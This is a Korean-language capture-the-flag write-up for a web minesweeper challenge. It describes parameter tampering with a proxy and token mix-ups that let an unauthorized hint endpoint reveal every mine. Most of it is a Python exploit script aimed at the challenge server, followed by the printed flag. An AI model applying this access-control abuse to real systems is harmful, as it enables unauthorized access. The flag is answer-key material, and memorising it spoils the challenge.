# 키워드
- python requests

#  풀이과정
- 웹 프록시툴로 난이도 조절을 하는 파라미터를 변조하여 다른 난이도 페이지에 접근할 수 있음을 알 수 있음
- 게임에 대한 토큰과 유저의 대한 토큰을 따로 관리하여, 다른 유저의 대한 권한으로 힌트를 사용하여 모든 위치에 폭탄 유무를 확인할 수 있었음
- 실제 exploit 에서는 토큰에 대한 언급을 하지 않았음, 만약 토큰을 유효하지 않은 것을 보내면 엉뚱한 위치정보를 알려주고, 유효한 토큰을 보내면 기회가 3번밖에 없어서 요청이 제한됨

---

- 시행착오가 많았지만 아래 함수들을 조합하여 문제를 해결할 수 있음
```python
import requests
import random

# KCTF{Art_Is_eXpL0Si0n__Gatsu!!!!!}

SIZE=10
DIFFICULTY="easy"

board=[[0 for _ in range(SIZE)]for _ in range(SIZE)]

def start():
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
    }
    data = {
        "difficulty": DIFFICULTY
    }
    response=requests.post("http://3.34.189.239:3000/new", headers=headers, data=data, allow_redirects=False)
    return response.headers['Location'].split(";")[0],response.headers['Location'].split(";")[1][11:]
    


def move(row, col, url, jsc):
    for i in range(row):
        for j in range(col):
            #if random.random() < 0.12:
                headers = {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Cookie": "JSESSIONID=" + jsc
                }

                data = {
                    "row": i,
                    "col": j
                }
                response = requests.post(url, headers=headers, data=data)

                if("Game lost :(" in response.text):
                    print(f"Row: {i}, Col: {j}, Result: false")
                    return False

                #return True
                print(f"Row: {i}, Col: {j}, Result: success")
    
    return True


def move_once(row, col, url, jsc):
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        #"Cookie": "JSESSIONID=" + jsc
    }
    data = {
        "row": row,
        "col": col
    }

    requests.post(url, headers=headers, data=data)



def check(row, col, url,jsc):
    for i in range(row):
        for j in range(col):
            headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                #"Cookie": "JSESSIONID=" + jsc
            }

            tmp="http://3.34.189.239:3000/api/checkMine?gameId={}&difficulty={}&row={}&col={}".format(url[30:],DIFFICULTY,i,j)
            response = requests.post(tmp, headers=headers)

            print(i,j,len(response.text))

            # if "error processing" not in response.text:
            if "Mine found!" in response.text:
                board[i][j]=1

    


if __name__ == '__main__':
    url,jsc=start()
    # while(True):
    #     if(move(15,15,url)):
    #         print(url)
    #         break
    #     else:  
    #         url=start()

    print(url)
    check(SIZE,SIZE,url,jsc)
    for i in range(SIZE):
        for j in range(SIZE):
            if board[i][j]==0:
                move_once(i,j,url,jsc)

    [print(row) for row in board]
    print(url)
```

# flag
![[스크린샷 2023-12-22 033045.png]]
![[스크린샷 2023-12-22 033503.png]]
![[스크린샷 2023-12-22 033315.png]]
